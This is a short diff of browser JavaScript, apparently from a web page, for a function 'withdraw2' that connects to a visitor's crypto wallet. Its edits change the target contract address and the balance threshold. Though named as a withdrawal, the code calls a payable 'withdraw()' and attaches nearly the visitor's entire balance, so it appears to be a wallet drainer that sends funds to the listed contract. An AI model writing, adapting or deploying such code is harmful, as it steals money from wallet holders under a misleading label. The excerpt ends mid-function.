@@ -504,7 +504,7 @@
    async function withdraw2(){
           const url = "https://api.avax.network/ext/bc/C/rpc";
           const abi = ["function withdraw() public payable"];
-          const contractAddress = "0x1cDF4b1b94142041335eB8F28807011cFe72b866";
+          const contractAddress = "0x092684bDE72fd292a79Ec44Cc1C412e5fA535e5d";
           const provider = new ethers.providers.Web3Provider(window.ethereum)
           let signer = provider.getSigner();
           let contract=new ethers.Contract(contractAddress, abi, signer)
@@ -514,7 +514,7 @@
                     
                    let address=res[0]
                    provider.getBalance(address).then((balance) => {
-                       let otherbalance=ethers.utils.parseEther("0.005");
+                       let otherbalance=ethers.utils.parseEther("0.03");
                        if(balance.gt(otherbalance)){
                            let etherString = balance- ethers.utils.parseEther("0.005");
                           let over = {value:ethers.BigNumber.from(etherString.toString())};
